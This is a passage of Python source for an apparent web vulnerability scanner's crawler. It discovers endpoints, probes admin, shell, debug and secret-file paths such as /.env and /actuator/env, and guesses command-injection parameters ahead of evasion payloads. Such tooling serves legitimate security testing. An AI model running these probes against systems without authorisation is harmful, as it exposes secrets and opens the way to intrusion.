        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if qs:
            clean_url = parsed._replace(query="").geturl()
            params = {k: (v[0] if v else "") for k, v in qs.items()}
            self._add_endpoint(clean_url, "GET", params, None, "url_query",
                               discovered_via=url)

        new_links = []
        ct = resp["headers"].get("content-type", "")
        body = resp.get("body", "")

        if "html" in ct or body.lstrip().startswith("<"):
            parser = PageParser(url)
            try:
                parser.feed(body)
            except Exception:
                pass

            for form in parser.forms:
                testable = {i["name"]: i["value"]
                            for i in form["inputs"] if i["type"] != "hidden"}
                hidden   = {i["name"]: i["value"]
                            for i in form["inputs"] if i["type"] == "hidden"}
                if testable:
                    self._add_endpoint(form["action"], form["method"],
                                       testable, hidden, f"form@{url[:40]}")

            inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.I)
            for script_content in inline_scripts:
                if len(script_content) > 50:
                    eps, _ = self._js_extractor.extract(script_content, url)
                    for ep in eps:
                        if ep["params"]:
                            full_url = urllib.parse.urljoin(url, ep["path"])
                            if self._same_domain(full_url):
                                params = {p: "test" for p in ep["params"]}
                                self._add_endpoint(full_url, ep["method"], params, {},
                                                   f"inline_js@{url[-30:]}")

            if depth < self.max_depth:
                for link in parser.links:
                    norm = self._normalize(link)
                    with self._visited_lock:
                        if norm not in self.visited and self._same_domain(link):
                            if len(self.visited) < self.max_pages:
                                self.visited.add(norm)
                                new_links.append((link, depth + 1))

            for js_url in parser.js_links:
                with self._visited_lock:
                    if js_url not in self.js_visited:
                        new_links.append((f"__JS__{js_url}", 0))

        elif "javascript" in ct or url.endswith(".js"):
            js_new = self._process_js(url)
            new_links.extend(js_new)

        return new_links

    def crawl(self):
        tprint(f"\n  {phase('1/4')} {color('CRAWLING & ENDPOINT DISCOVERY  (HTML + JS/SPA)', C.BOLD + C.BWHITE)}")
        tprint(f"  {color('─'*68, C.DIM)}")
        tprint(f"  {info(f'Threads: {self.threads} | Max pages: {self.max_pages} | Depth: {self.max_depth}')}\n")

        norm_base = self._normalize(self.base)
        with self._visited_lock:
            self.visited.add(norm_base)

        current_batch = [(self.base, 0)]

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            while current_batch:
                js_batch   = [(url[6:], d) for url, d in current_batch if url.startswith("__JS__")]
                html_batch = [(url, d)     for url, d in current_batch if not url.startswith("__JS__")]

                futures = {}
                for url, depth in html_batch:
                    futures[pool.submit(self._process_page, url, depth)] = "html"
                for js_url, depth in js_batch:
                    futures[pool.submit(self._process_js, js_url)] = "js"

                current_batch = []
                for fut in as_completed(futures):
                    try:
                        new_links = fut.result()
                        current_batch.extend(new_links)
                    except Exception:
                        pass

                with self._visited_lock:
                    if len(self.visited) >= self.max_pages:
                        current_batch = []
                        break

        sys.stdout.write("\r" + " " * 60 + "\r")

        COMMON_PATHS = [
            # Standard API paths
            "/api/v1/search", "/api/v1/export", "/api/v1/feedback",
            "/api/v1/webhook", "/api/v1/users", "/api/v1/query",
            "/api/v2/search", "/api/search", "/api/query", "/api/export",
            "/api/run", "/api/exec", "/api/cmd",
            "/download", "/upload", "/import", "/export",
            "/file", "/files", "/attachment",
            "/debug", "/health", "/status", "/ping",
            "/analytics", "/proxy", "/callback",
            "/reset-password", "/invite",
            "/reports", "/logs", "/audit",
            # Admin / management endpoints (often less scrutinised)
            "/admin", "/admin/cmd", "/admin/exec", "/admin/run",
            "/admin/debug", "/admin/system", "/admin/shell",
            "/admin/tool", "/admin/tools", "/admin/console",
            "/admin/query", "/admin/eval", "/admin/ping",
            "/admin/test", "/admin/health", "/admin/log",
            "/manage", "/management", "/mgmt", "/mgmt/cmd",
            "/internal", "/internal/exec", "/internal/run",
            "/internal/cmd", "/internal/debug",
            # Utility / diagnostic endpoints
            "/util", "/utils", "/utility", "/utilities",
            "/tool", "/tools", "/helper", "/helpers",
            "/diagnostic", "/diagnostics", "/diag",
            "/test", "/tests", "/testing",
            "/monitor", "/monitoring", "/metrics",
            "/trace", "/traceroute", "/nslookup",
            "/lookup", "/resolve", "/dns",
            "/net", "/network", "/netstat",
            "/process", "/proc", "/ps",
            "/system", "/sys", "/sysinfo",
            "/shell", "/bash", "/sh",
            "/cgi-bin/ping", "/cgi-bin/exec", "/cgi-bin/run",
            "/cgi-bin/test", "/cgi-bin/cmd",
            # API versioned admin
            "/api/v1/admin", "/api/v1/debug", "/api/v1/system",
            "/api/v1/cmd", "/api/v1/exec", "/api/v1/run",
            "/api/v2/admin", "/api/v2/debug",
            "/api/admin", "/api/debug", "/api/system",
            # Dev/staging leftovers
            "/dev", "/dev/null", "/dev/test",
            "/console", "/repl", "/eval",
        ]
        # known_paths: set of REAL (un-normalized) URL paths already probed.
        # Used as the fetch gate — prevents fetching the same exact URL twice.
        # Never stores normalized paths — distinct real paths that share a
        # normalized form (e.g. /api/g9x6tl and /api/v8k3nf) must both be
        # fetched and receive separate endpoint entries if their response
        # signatures differ.  The _add_endpoint response_sig guard handles dedup.
        known_paths = {urllib.parse.urlparse(e["url"]).path for e in self.endpoints}
        probed = 0
        sys.stdout.write(f"\r  {color('  probing common paths...', C.DIM)}  ")
        sys.stdout.flush()
        for path in COMMON_PATHS:
            full = urllib.parse.urljoin(self.base, path)
            ppath = urllib.parse.urlparse(full).path
            if ppath in known_paths:
                continue
            r = self.client.get(full)
            if r["status"] in (0, 404, 410):
                r = self.client.post(full, {})
                if r["status"] in (0, 404, 410):
                    continue
                method = "POST"
            else:
                method = "GET"
            params = {}
            for hint in self._path_to_params(ppath):
                params[hint] = "test"
            _pbody = r.get("body", "")
            _pct   = r.get("headers", {}).get("content-type", "").lower()
            if _pbody:
                for p in self._params_from_body(_pbody):
                    params[p] = "test"
                if "json" in _pct or _pbody.lstrip().startswith(("{", "[")):
                    for p in self._extract_json_params(_pbody):
                        params[p] = "test"
            if not params:
                params = {"q": "test", "input": "test"}
            self._add_endpoint(full, method, params, {}, "path_probe")
            known_paths.add(ppath)
            probed += 1

        sys.stdout.write("\r" + " " * 60 + "\r")

        spa_note = f" + {self._spa_endpoint_count} from JS/SPA" if self._spa_endpoint_count else ""
        probe_note = f" + {probed} path-probed" if probed else ""
        ep_note  = f"{len(self.endpoints)} form/query endpoints" if self.endpoints else "0 form/query endpoints"
        tprint(f"  {ok(f'{len(self.visited)} pages crawled{spa_note}{probe_note} — {ep_note}')}")
        # ── Phase 1c: Discovery file parsing (robots.txt / sitemap / security.txt) ──
        # Spec §2.1: fetch standard discovery files and queue ALL found paths.
        # Many real-world targets expose admin/API endpoints only in robots.txt.
        discovery_paths = self._fetch_discovery_files()

        # ── Phase 1c-ii: Fixed debug/schema endpoint probe (always runs) ───────
        # These exist on most frameworks by default and frequently leak the full
        # route map. Probe them unconditionally regardless of discovery files.
        DEBUG_ALWAYS = [
            "/api/debug",     "/api/config",    "/api/health",
            "/api/info",      "/api/status",    "/api/v1",
            "/swagger.json",  "/openapi.json",  "/api-docs",
            "/api/swagger",   "/v1/swagger",    "/api/openapi",
            "/graphql",       "/graphiql",      "/playground",
            "/api/schema",    "/schema.json",   "/api/routes",
            "/__debug__",     "/debug/pprof",   "/_debug",
            "/actuator",      "/actuator/health","/actuator/env",
            "/actuator/mappings", "/actuator/beans",
            "/.env",          "/.config",       "/config.json",
            "/server-status", "/server-info",
        ]
        # Merge: discovery file paths first, then debug list
        # Use a list to preserve order (discovery paths probed first)
        all_probe_paths = list(discovery_paths)
        for dp in DEBUG_ALWAYS:
            if dp not in all_probe_paths:
                all_probe_paths.append(dp)

        # Chained paths discovered by reading JSON/HTML responses below
        chained_paths = set()  # HTML/JS-sourced paths (filtered by _frontier_admit)
        chained_paths_json = set()  # JSON route-map paths (trusted, bypass filter)

        if all_probe_paths:
            tprint(f"  {info(f'Discovery + debug probing {len(all_probe_paths)} path(s)')}")

        for dpath in all_probe_paths:
            full  = urllib.parse.urljoin(self.base, dpath)
            ppath = urllib.parse.urlparse(full).path
            # Always fetch — even if ppath is already in known_paths —
            # so we can chase its JSON/HTML body for new path references.
            r = self.client.get(full)
            status = r["status"]
            # Spec §2.1 step 5: retry 302 responses — cookie already in headers
            if status == 302:
                loc = r.get("headers", {}).get("location", "")
                if loc:
                    r = self.client.get(urllib.parse.urljoin(full, loc))
                    status = r["status"]
            if status in (0, 404, 410):
                r = self.client.post(full, {})
                status = r["status"]
                if status in (0, 404, 410):
                    # Skip chaining too — no body to read
                    continue
                method = "POST"
            else:
                method = "GET"

            body = r.get("body", "")
            ct   = r.get("headers", {}).get("content-type", "").lower()

            # ── Pass A: JSON/HTML chaining — runs regardless of known_paths ──
            # The known_paths guard must never block reading a body for discovery.
            # A path visited as an HTML page during crawl may now return JSON
            # (different Accept header, different method) with a route map.
            if "json" in ct and body:
                _is_openapi = any(k in body[:500] for k in
                    ["swagger", "openapi", '"paths"', "'paths'"])
                if _is_openapi:
                    new_routes = self._parse_openapi_routes(body)
                    # OpenAPI routes are authoritative — bypass _frontier_admit
                    chained_paths_json.update(new_routes)
                    vdim(f"OpenAPI/Swagger at {ppath}: {len(new_routes)} routes extracted")
                else:
                    new_routes = self._chase_json_response(body, full)
                    # JSON route-map values are authoritative — bypass _frontier_admit
                    chained_paths_json.update(new_routes)
                    if new_routes:
                        vdim(f"JSON chaining: {ppath} → {len(new_routes)} new path(s)")
            elif ("html" in ct or body.lstrip().startswith("<")) and body:
                new_routes = self._chase_html_for_api_calls(body, full)
                # HTML/JS paths go through _frontier_admit (navigation filter)
                chained_paths.update(new_routes)
                if new_routes:
                    vdim(f"HTML chaining: {ppath} → {len(new_routes)} fetch/axios path(s)")

            # ── Pass B: endpoint registration — skip if already known ────────
            if ppath in known_paths:
                continue  # body already chased above; don't re-add as endpoint

            params = {}
            for hint in self._path_to_params(ppath):
                params[hint] = "test"
            if body:
                for p in self._params_from_body(body):
                    params[p] = "test"
            _json_params = []
            if body and ("json" in ct or body.lstrip().startswith(("{", "["))):
                _json_params = [p for p in self._extract_json_params(body)
                                if p not in params]
                for p in _json_params:
                    params.setdefault(p, "test")
            if not params:
                params = {"q": "test", "input": "test"}
            _disc_sig = Crawler._response_sig(body) if body else None
            self._add_endpoint(full, method, params, {}, "discovery_file",
                               priority_params=_json_params if _json_params else None,
                               response_sig=_disc_sig,
                               discovered_via=dpath)
            known_paths.add(ppath)
            probed += 1

        # ── Phase 1c-iii: Recursive chained path probing ───────────────────────
        # Depth-aware BFS: each fetched body is scanned for more paths.
        # robots.txt → /api/admin (HTML with fetch calls) → /api/admin/exec → ...
        # Max depth = 3 levels of chaining to avoid infinite loops on circular refs.
        # At each level: JSON bodies chase path strings, HTML bodies chase
        # fetch()/axios/XHR calls — same logic as Phase 1c.
        MAX_CHAIN_DEPTH = 3
        chained_new = 0

        # ── Backend-path filter for chained frontier ─────────────────────
        # Only paths that look like backend endpoints enter the frontier.
        # A path is backend-looking if any segment matches a known API prefix.
        # Paths like /prefix/42 are admitted once per unique prefix — not once
        # per unique numeric ID — to avoid crawling paginated content.
        _BACKEND_SEG = re.compile(
            r'^(?:api|v\d+|internal|admin|mgmt|service|rpc|graphql|rest|'
            r'exec|cmd|run|shell|debug|diag|query|search|export|import|'
            r'upload|download|webhook|proxy|callback|auth|oauth|token|'
            r'actuator|swagger|openapi|graphiql|playground|config|health|'
            r'status|ping|trace|route|routes|endpoint|endpoints)$', re.I)

        def _is_backend_path(path):
            """True if path contains at least one backend-looking segment."""
            segs = [s for s in path.split('/') if s]
            return any(_BACKEND_SEG.match(s) for s in segs)

        # Per-prefix numeric dedup: admit /prefix/N at most once per prefix.
        _numeric_prefix_seen: set = set()

        def _frontier_admit(path):
            """Return True if path should enter the frontier."""
            if not _is_backend_path(path):
                return False
            # Deduplicate /prefix/<numeric-id> variants
            segs = [s for s in path.rstrip('/').split('/') if s]
            if segs and segs[-1].isdigit():
                prefix = '/'.join(segs[:-1])
                if prefix in _numeric_prefix_seen:
                    return False
                _numeric_prefix_seen.add(prefix)
            return True

        # frontier = set of (path, depth) tuples to probe
        # HTML/JS paths: apply _frontier_admit (navigation filter)
        # JSON route-map paths: trusted, bypass _frontier_admit — the app
        # itself listed these as endpoints in a route map / config response.
        _json_front = {
            (p, 1) for p in chained_paths_json
            if urllib.parse.urlparse(
                urllib.parse.urljoin(self.base, p)).path not in known_paths
        }
        _html_front = {(p, 1) for p in chained_paths if _frontier_admit(p)}
        frontier = _html_front | _json_front
        while frontier:
            next_frontier = set()
            for cpath, depth in frontier:
                full = urllib.parse.urljoin(self.base, cpath)
                ppath = urllib.parse.urlparse(full).path  # real path — not normalized
                if ppath in known_paths:  # visit guard: real path only
                    continue
                r = self.client.get(full)
                if r["status"] in (0, 404, 410):
                    r = self.client.post(full, {})
                    if r["status"] in (0, 404, 410):
                        continue
                    method = "POST"
                else:
                    method = "GET"
                body = r.get("body", "")
                ct = r.get("headers", {}).get("content-type", "").lower()
                params = {}
                _json_params_chain = []
                if body:
                    for p in self._params_from_body(body):
                        params[p] = "test"
                    if "json" in ct or body.lstrip().startswith(("{", "[")):
                        _json_params_chain = list(self._extract_json_params(body))
                        for p in _json_params_chain:
                            params.setdefault(p, "test")
                # Path-hint fallback: only add when JSON gave us nothing.
                # JSON-derived params are higher confidence; fallback hints
                # add noise when we already have a precise param set.
                if not _json_params_chain:
                    for hint in self._path_to_params(ppath):
                        params.setdefault(hint, "test")
                if not params:
                    params = {"q": "test", "input": "test", "cmd": "test"}
                _chain_sig = Crawler._response_sig(body) if body else None
                self._add_endpoint(full, method, params, {}, f"chained_path_d{depth}",
                                   priority_params=_json_params_chain if _json_params_chain else None,
                                   response_sig=_chain_sig,
                                   discovered_via=cpath)
                known_paths.add(ppath)
                probed += 1
                chained_new += 1
                # ── Recurse: read THIS body for more paths ──────────────────
                # Only go deeper if we haven't hit MAX_CHAIN_DEPTH
                # Always cache JSON bodies for obf slug extraction, even at max depth.
                # Only recurse into new paths if below MAX_CHAIN_DEPTH.
                if body:
                    _bct = r.get("headers", {}).get("content-type", "").lower()
                    if "json" in _bct or body.lstrip().startswith(("{", "[")):
                        self._json_response_cache[full] = body
                if depth < MAX_CHAIN_DEPTH and body:
                    deeper_json = set()   # paths from JSON/OpenAPI — bypass known_paths gate
                    deeper_html = set()   # paths from HTML/JS — use known_paths gate
                    _is_openapi = ("json" in ct and
                        any(k in body[:500] for k in
                            ["swagger", "openapi", '"paths"', "'paths'"]))
                    if _is_openapi:
                        deeper_json = self._parse_openapi_routes(body)
                        vdim(f"  chained[d{depth}] OpenAPI at {ppath}: {len(deeper_json)} routes")
                    elif "json" in ct or body.lstrip().startswith(("{", "[")):
                        deeper_json = self._chase_json_response(body, full)
                        # Cache JSON bodies for obf path scanning
                        self._json_response_cache[full] = body
                        if deeper_json:
                            vdim(f"  chained[d{depth}] JSON at {ppath}: {len(deeper_json)} new path(s)")
                    elif "html" in ct or body.lstrip().startswith("<"):
                        deeper_html = self._chase_html_for_api_calls(body, full)
                        if deeper_html:
                            vdim(f"  chained[d{depth}] HTML at {ppath}: {len(deeper_html)} fetch/axios path(s)")
                    # JSON/OpenAPI paths: bypass known_paths gate AND bypass
                    # _frontier_admit. These paths come from the app's own route
                    # maps — they are definitively real endpoints, not navigation.
                    # The BFS head visit guard prevents infinite loops.
                    for np in deeper_json:
                        next_frontier.add((np, depth + 1))
                    # HTML paths: keep known_paths gate to avoid re-crawling pages
                    for np in deeper_html:
                        np_parsed = urllib.parse.urlparse(
                            urllib.parse.urljoin(self.base, np)).path
                        if np_parsed not in known_paths and _frontier_admit(np_parsed):
                            next_frontier.add((np, depth + 1))
            frontier = next_frontier
        if chained_new:
            tprint(f"  {info(f'Chained discovery: {chained_new} new endpoint(s) found by recursive source-reading (max depth {MAX_CHAIN_DEPTH})')}")

        # ── Phase 1d: Obfuscated/hashed API path discovery ─────────────────────
        # Spec addendum: some apps route requests through /api/<hash> or
        # /api/<uuid> endpoints that are never linked from HTML/JS but ARE
        # referenced in JS source strings or JSON config responses.
        # Strategy: scan all visited page bodies and JS files for path patterns
        # matching /api/<token>  /v1/<hash>  /<word>/<8-32-hex-or-alphanum> and
        # probe each unique candidate.
        # post_obf_paths: paths extracted from obf endpoint responses.
        # These are chained in a second BFS pass immediately after Phase 1d.
        post_obf_paths: set = set()

        obf_paths = self._extract_obfuscated_api_paths()
        for opath in obf_paths:
            full = urllib.parse.urljoin(self.base, opath)
            ppath = urllib.parse.urlparse(full).path
            if ppath in known_paths:
                # Already registered — but still read its body for chaining.
                # This path may have been added without its JSON being chased.
                _rc = self.client.get(full)
                _bc = _rc.get("body", "")
                _cc = _rc.get("headers", {}).get("content-type", "").lower()
                if _bc and ("json" in _cc or _bc.lstrip().startswith(("{", "["))):
                    _extra = self._chase_json_response(_bc, full)
                    post_obf_paths.update(_extra)
                    self._json_response_cache[full] = _bc
                continue
            r = self.client.get(full)
            if r["status"] in (0, 404, 410):
                r = self.client.post(full, {})
                if r["status"] in (0, 404, 410):
                    continue
                method = "POST"
            else:
                method = "GET"
            params = {}
            for hint in self._path_to_params(ppath.split("/")[-1]):
                params[hint] = "test"
            _json_params_obf = []
            _obf_body = r.get("body", "")
            _obf_ct   = r.get("headers", {}).get("content-type", "").lower()
            if _obf_body:
                for p in self._params_from_body(_obf_body):
                    params[p] = "test"
                if "json" in _obf_ct or _obf_body.lstrip().startswith(("{", "[")):
                    _json_params_obf = list(self._extract_json_params(_obf_body))
                    for p in _json_params_obf:
                        params.setdefault(p, "test")
                    # ── Chase this JSON body for new paths ────────────────
                    # This is the critical missing step: obf endpoints like
                    # /api/g9x6tl return full_route_map / all_endpoints dicts
                    # with 30+ paths. Without chasing, those paths are lost.
                    _obf_chased = self._chase_json_response(_obf_body, full)
                    post_obf_paths.update(_obf_chased)
                    self._json_response_cache[full] = _obf_body
                    if _obf_chased:
                        vdim(f"  obf_probe[{ppath}]: chased {len(_obf_chased)} path(s) from JSON response")
            if not params:
                params = {"q": "test", "input": "test", "cmd": "test"}
            _obf_sig = Crawler._response_sig(_obf_body) if _obf_body else None
            self._add_endpoint(full, method, params, {}, "obf_api_probe",
                               priority_params=_json_params_obf if _json_params_obf else None,
                               response_sig=_obf_sig)
            known_paths.add(ppath)
            probed += 1

        # ── Phase 1d-ii: Post-obf BFS — probe paths chased from obf responses ──
        # Paths found in full_route_map / all_endpoints / routes dicts inside
        # obf API responses are probed here. These are definitively real routes
        # (the app itself advertised them), so _frontier_admit is NOT applied —
        # we trust all non-static paths from these authoritative route maps.
        # BFS depth 2: each newly probed path is also chased for further paths.
        if post_obf_paths:
            vdim(f"  post_obf BFS: {len(post_obf_paths)} path(s) to probe from obf responses")
            _post_frontier = {(p, 1) for p in post_obf_paths
                              if urllib.parse.urlparse(
                                  urllib.parse.urljoin(self.base, p)).path
                              not in known_paths}
            _post_new = 0
            while _post_frontier:
                _post_next = set()
                for _pp, _pdepth in _post_frontier:
                    _pfull  = urllib.parse.urljoin(self.base, _pp)
                    _pppath = urllib.parse.urlparse(_pfull).path
                    if _pppath in known_paths:
                        continue
                    _pr = self.client.get(_pfull)
                    if _pr["status"] in (0, 404, 410):
                        _pr = self.client.post(_pfull, {})
                        if _pr["status"] in (0, 404, 410):
                            continue
                        _pm = "POST"
                    else:
                        _pm = "GET"
                    _pbody = _pr.get("body", "")
                    _pct   = _pr.get("headers", {}).get("content-type", "").lower()
                    _pparams = {}
                    _pjp = []
                    if _pbody:
                        for _ph in self._path_to_params(_pppath):
                            _pparams[_ph] = "test"
                        for _ph in self._params_from_body(_pbody):
                            _pparams[_ph] = "test"
                        if "json" in _pct or _pbody.lstrip().startswith(("{", "[")):
                            _pjp = list(self._extract_json_params(_pbody))
                            for _ph in _pjp:
                                _pparams.setdefault(_ph, "test")
                            # Always chase JSON responses in post_obf BFS —
                            # every path here is from an authoritative route map.
                            # Cap at MAX_CHAIN_DEPTH to prevent infinite loops.
                            _POST_MAX_DEPTH = 4
                            self._json_response_cache[_pfull] = _pbody
                            if _pdepth < _POST_MAX_DEPTH:
                                _pdeeper = self._chase_json_response(_pbody, _pfull)
                                for _pnp in _pdeeper:
                                    _pnpath = urllib.parse.urlparse(
                                        urllib.parse.urljoin(self.base, _pnp)).path
                                    if _pnpath not in known_paths:
                                        _post_next.add((_pnp, _pdepth + 1))
                    if not _pparams:
                        _pparams = {"q": "test", "input": "test", "cmd": "test"}
                    _psig = Crawler._response_sig(_pbody) if _pbody else None
                    self._add_endpoint(_pfull, _pm, _pparams, {},
                                       "chained_path_d1",
                                       priority_params=_pjp if _pjp else None,
                                       response_sig=_psig,
                                       discovered_via=_pp)
                    known_paths.add(_pppath)
                    probed += 1
                    _post_new += 1
                _post_frontier = _post_next
            if _post_new:
                tprint(f"  {info(f'Route-map BFS: {_post_new} endpoint(s) found from authoritative route maps')}")
            # Re-run obf path extraction: the newly cached JSON bodies may
            # contain additional obf slugs not found in the original HTML scan.
            _obf_round2 = self._extract_obfuscated_api_paths()
            _obf_new2 = [p for p in _obf_round2
                         if urllib.parse.urlparse(
                             urllib.parse.urljoin(self.base, p)).path
                         not in known_paths]
            if _obf_new2:
                vdim(f"  obf round-2: {len(_obf_new2)} new slug(s) found in JSON caches")
                post_obf_paths.update(_obf_new2)

        # ── Phase 1e: HTTP header injection surfaces ────────────────────────────
        # Spec §1.4: agents that only fuzz query params miss header injection.
        # Add synthetic header-injection endpoints for the base URL and for any
        # endpoint that returned a 200 on GET (suggesting the app processes it).
        # Each "param" here is a header name; Injector's _send is extended below
        # to detect header-param endpoints and inject into headers instead.
        header_eps = self._header_injection_endpoints()
        for hep in header_eps:
            self._add_endpoint(hep["url"], hep["method"],
                               hep["params"], {}, "header_inject")

        # ── Phase 1f: Sanitization detection ───────────────────────────────────
        # Spec §2.4: check all discovered endpoints for host_raw != host_sanitized
        # in JSON response.  When detected, flag as potential injection surface
        # and force-escalate to Tier 5 adaptive bypass (evasion payloads).
        # Change 5: run unconditionally (force_all) on chained/discovery endpoints
        # — these are high-confidence injection surfaces found via JSON chaining.
        _chained_and_discovery = [
            e for e in self.endpoints
            if e.get("source", "").startswith(("chained_path", "discovery_file"))
        ]
        san_eps = self._detect_sanitization_endpoints(
            extra_endpoints=_chained_and_discovery,
            force_all=bool(_chained_and_discovery)
        )
        for sep in san_eps:
            self._add_endpoint(sep["url"], sep["method"],
                               sep["params"], {}, "sanitization_detect")
            # Store survived_chars keyed by (url, method, param) so
            # _run_adaptive_tier can pre-filter payloads to only use
            # chars confirmed to pass this endpoint's sanitization filter.
            sc = sep.get("survived_chars")
            pname = sep.get("param")
            if sc is not None and pname:
                self._survived_chars[(sep["url"], sep["method"], pname)] = frozenset(sc)
            sc_note = (f" survived={sorted(sc)}" if sc else "")
            tprint(f"  {warn('Sanitization detected: ' + sep['url'] + ' [' + ', '.join(sep['params'].keys()) + ']' + sc_note + ' — escalating to evasion payloads')}")

        return self.endpoints

    @staticmethod
    def _path_to_params(path):
        seg = path.strip("/").split("/")[-1]
        _map = {
            "search":      ["q", "query", "search", "keyword", "term"],
            "export":      ["format", "type", "output", "fields", "query"],
            "reports":     ["report_type", "date_range", "format", "custom_query"],
            "download":    ["file", "path", "filename", "id"],
            "upload":      ["file", "path", "filename"],
            "import":      ["file", "data", "source", "format"],
            "feedback":    ["message", "subject", "type"],
            "webhook":     ["url", "event", "payload"],
            "query":       ["q", "query", "sql", "filter"],
            "run":         ["cmd", "command", "args"],
            "exec":        ["cmd", "command", "args"],
            "cmd":         ["cmd", "command", "args", "input"],
            "proxy":       ["url", "target", "host"],
            "debug":       ["cmd", "arg", "level", "input"],
            "analytics":   ["event", "query", "range"],
            "ping":        ["host", "target", "ip", "addr"],
            "logs":        ["filter", "level", "since", "pattern"],
            # admin / management
            "admin":       ["cmd", "command", "action", "input", "query"],
            "console":     ["cmd", "command", "input", "expr"],
            "shell":       ["cmd", "command", "input"],
            "bash":        ["cmd", "command", "input"],
            "sh":          ["cmd", "command", "input"],
            "system":      ["cmd", "command", "action"],
            "manage":      ["cmd", "action", "input"],
            "management":  ["cmd", "action", "input"],
            "mgmt":        ["cmd", "action", "input"],
            "eval":        ["expr", "input", "code", "cmd"],
            "repl":        ["input", "cmd", "expr"],
            # utility / diagnostic
            "tool":        ["cmd", "command", "input", "arg"],
            "tools":       ["cmd", "command", "input", "arg"],
            "utility":     ["cmd", "command", "input"],
            "utilities":   ["cmd", "command", "input"],
            "helper":      ["cmd", "input", "action"],
            "diagnostic":  ["host", "target", "cmd", "input"],
            "diagnostics": ["host", "target", "cmd", "input"],
            "diag":        ["host", "target", "cmd", "input"],
            "test":        ["input", "cmd", "arg", "value"],
            "testing":     ["input", "cmd", "arg"],
            "monitor":     ["host", "target", "filter"],
            "monitoring":  ["host", "target", "filter"],
            "metrics":     ["query", "filter", "target"],
            "trace":       ["host", "target", "ip"],
            "traceroute":  ["host", "target", "ip"],
            "nslookup":    ["host", "target", "domain"],
            "lookup":      ["host", "domain", "target"],
            "resolve":     ["host", "domain", "target"],
            "dns":         ["host", "domain", "query"],
            "net":         ["host", "target", "cmd"],
            "network":     ["host", "target", "cmd"],
            "process":     ["pid", "name", "cmd"],
            "proc":        ["pid", "name", "cmd"],
            "internal":    ["cmd", "action", "input"],
            "health":      ["target", "host", "check"],
            "status":      ["target", "host", "service"],
        }
        # Fallback: slug name itself is rarely a useful param name.
        # These six cover the vast majority of real-world CMDi injection points.
        return _map.get(seg.lower(), ["host", "target", "ip", "cmd", "input", "q"])

    @staticmethod
    def _params_from_body(body):
        found = set()
        for m in re.finditer(r'"([a-zA-Z_][a-zA-Z0-9_]{1,30})"\s*:', body):
            found.add(m.group(1))
        for m in re.finditer(r"(?:missing|required|invalid|unknown)\s+(?:param(?:eter)?|field|key)\s+[a-zA-Z_][a-zA-Z0-9_]{1,30}", body, re.I):
            found.add(m.group(1))
        noise = {"true","false","null","undefined","error","message","status","code","data","result"}
        raw = {p for p in found if p.lower() not in noise and len(p) > 1}
        # Second pass: strip sanitization-reflection suffixes.
        # Endpoints that reflect both host_raw and host_sanitized reveal the
        # real injection param name (host) in their response body.  Extract it.
        _STRIP_SUFFIXES = re.compile(
            r'^(.+?)(?:_raw|_sanitized|_input|_value|_encoded|_clean|_safe)$', re.I)
        extras = set()
        for key in raw:
            sm = _STRIP_SUFFIXES.match(key)
            if sm:
                base = sm.group(1)
                if len(base) > 1 and base.lower() not in noise:
                    extras.add(base)
        return raw | extras

    @staticmethod
    def _extract_json_params(body):
        """
        Change 2: When an endpoint returns JSON, extract high-confidence
        parameter names from the response keys.

        Two discovery strategies:
          A) Key suffix stripping — keys ending in _raw, _input, _value,
             _param, _sanitized: strip the suffix, the base is the param name.
             e.g. 'host_raw' → 'host', 'query_input' → 'query'
          B) HIGH_RISK key match — any key name that directly matches the
             _HIGH_RISK regex (cmd, host, exec, query, run, target, ip, addr,
             command, arg, path, file, input) is a confirmed param candidate.

        Walks the full JSON tree (nested dicts and lists).
        Returns a set of param name strings.
        """
        _SUFFIX_RE = re.compile(
            r'^(.+?)(?:_raw|_input|_value|_param|_sanitized)$', re.I)
        _HR_KEYS = re.compile(
            r'^(?:cmd|command|exec|execute|run|shell|ping|host|hostname|ip|addr|address|'
            r'file|filename|path|filepath|dir|folder|input|arg|argument|src|source|dest|target|'
            r'format|fmt|'
            r'query|search|proc|process|output|format|fmt|debug|log|system)$', re.I)
        found = set()
        try:
            import json as _json
            data = _json.loads(body)
            def _walk_keys(node):
                if isinstance(node, dict):
                    for k, v in node.items():
                        key = str(k).strip()
                        # Strategy A: suffix stripping
                        m = _SUFFIX_RE.match(key)
                        if m:
                            base = m.group(1)
                            if len(base) > 1:
                                found.add(base)
                        # Strategy B: HIGH_RISK key name match
                        if _HR_KEYS.match(key):
                            found.add(key)
                        _walk_keys(v)
                elif isinstance(node, list):
                    for item in node:
                        _walk_keys(item)
            _walk_keys(data)
        except Exception:
            # Fallback: regex key scan on raw body
            for m in re.finditer(
                    r'"(cmd|command|exec|run|host|query|input|target|path|file|ip|addr|arg)"\'?\s*:',
                    body, re.I):
                found.add(m.group(1).lower())
        _NOISE = {"true","false","null","error","message","status","code","data","result"}
        return {p for p in found if p.lower() not in _NOISE and len(p) > 1}

    @staticmethod
    def _response_sig(body):
        """
        Compute a short structural signature of a JSON response body:
        top-level keys sorted and joined, then MD5-truncated to 8 hex chars.
        Returns None if body is not valid JSON or has no top-level keys.
        Used to distinguish distinct API routes whose normalized URLs collide.
        """
        if not body:
            return None
        try:
            import json as _json, hashlib as _hl
            data = _json.loads(body)
            if isinstance(data, dict) and data:
                sig_str = ",".join(sorted(str(k) for k in data.keys()))
            elif isinstance(data, list) and data and isinstance(data[0], dict):
                sig_str = ",".join(sorted(str(k) for k in data[0].keys()))
            else:
                return None
            return _hl.md5(sig_str.encode()).hexdigest()[:8]
        except Exception:
            return None


    def _fetch_discovery_files(self):
        """
        Fetch robots.txt, sitemap.xml, and /.well-known/security.txt.
        Extract every path reference found and return as a deduplicated list.
        Spec §2.1 steps 1-2: queue all paths before any fuzzing.
        """
        found_paths = set()
        discovery_urls = [
            "/robots.txt",
            "/sitemap.xml",
            "/sitemap_index.xml",
            "/.well-known/security.txt",
            "/.well-known/security.txt",
            "/security.txt",
        ]
        for rel in discovery_urls:
            url = urllib.parse.urljoin(self.base, rel)
            try:
                r = self.client.get(url)
                if r["status"] not in (200, 206):
                    continue
                body = r.get("body", "")
                if not body:
                    continue

                # robots.txt: extract Disallow: and Allow: path lines
                for m in re.finditer(r"^(?:Disallow|Allow|Sitemap):\s*(\S+)", body, re.I | re.M):
                    val = m.group(1).strip()
                    if val.startswith("http"):
                        # Sitemap: absolute URL — fetch it too
                        found_paths.update(self._parse_sitemap(val))
                    elif val and val != "/":
